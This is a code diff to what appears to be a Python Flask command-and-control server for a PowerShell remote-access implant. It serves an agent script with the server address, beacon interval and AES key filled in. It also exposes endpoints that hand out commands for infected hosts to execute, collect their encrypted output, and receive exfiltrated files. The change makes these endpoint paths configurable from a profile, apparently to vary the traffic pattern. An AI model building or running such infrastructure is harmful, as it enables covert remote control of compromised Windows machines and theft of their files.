@@ -16,6 +16,11 @@ from esa import *
 from flask import *
 import logging
 
+parentfolder = os.path.abspath("..")
+if parentfolder not in sys.path:
+    sys.path.insert(0, parentfolder)
+
+from profile import *
 # disable logging
 
 app = Flask(__name__)
@@ -68,27 +73,32 @@ class NewListener:
         thread.start()
     listeners_information[self.name] = [self.name, self.bindip, self.bindport, self.host, self.interval, self.path, self.ssl]
   def powershell_code(self):
-      #return self.host
-#    if request.headers["User-Agent"] != "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36":
-#        return "Hello World !"
-#    else:
-        f = open("agents/agent.ps1")
+        f = open("agents/agent.ps1.oct")
         if self.ssl == True:
             proto = "https"
         elif self.ssl == False:
             proto = "http"
 
+        srvhost = self.host + ":" + str(self.bindport)
+        command_host_url = command_send_url.split("/")[1]
         pcode = f.read()
-        return pcode.replace("SRVHOST", self.host+":"+self.bindport).replace("OCU_INTERVAL", str(self.interval)).replace("OCU_PROTO", proto).replace("OCT_KEY", aes_encryption_key)
-
-
+        pcode1 = pcode.replace("OCU_INTERVAL", self.interval)
+        pcode2 = pcode1.replace("OCT_KEY", aes_encryption_key)
+        pcode3 = pcode2.replace("OCT_first_ping", first_ping_url.split("/")[1])
+        pcode4 = pcode3.replace("OCT_command", command_host_url)
+        pcode5 = pcode4.replace("OCT_report", report_url.split("/")[1])
+        pcode6 = pcode5.replace("OCT_file_receiver", file_reciver_url.split("/")[1])
+        pcode7 = pcode6.replace("OCT_command_receiver", command_receiver_url.split("/")[1])
+        pcode8 = pcode7.replace("OCU_PROTO", proto)
+        pcode9 = pcode8.replace("SRVHOST", srvhost)
+        return pcode9
 
 
   def create_path(self):
       app.add_url_rule("/%s" % self.path, self.host , self.powershell_code)
 
 
-@app.route("/file_receiver", methods=["POST"])
+@app.route(file_reciver_url, methods=["POST"])
 def fr():
     filename = decrypt_command(aes_encryption_key, request.form["fn"].replace(" ","+"))
     f = open(filename, "wb")
@@ -101,7 +111,7 @@ def fr():
     print colored("\n[+] File %s downloaded from the client !" % filename, "green")
     return "True"
 
-@app.route("/report")
+@app.route(report_url)
 def report():
     encrypted_host = request.headers["App-Logic"]
     hostname = decrypt_command(aes_encryption_key, encrypted_host).strip("\x00")
@@ -116,7 +126,7 @@ def report():
             return "GoAway"
 
 
-@app.route("/command/<hostname>")
+@app.route(command_send_url)
 def command(hostname):
     for key in connections_information.keys():
         if hostname in connections_information[key]:
@@ -129,7 +139,7 @@ def command(hostname):
             return "False"
     return command_to_execute
 
-@app.route("/command_receiver")
+@app.route(command_receiver_url)
 def cr():
         #if request.method == "POST":
         encrypted_response = request.headers["Authorization"]
@@ -140,7 +150,7 @@ def cr():
         #    return "A"
 
 
-@app.route("/first_ping")
+@app.route(first_ping_url)
 def first_ping():
     	    global counter
             header = request.headers["Authorization"]
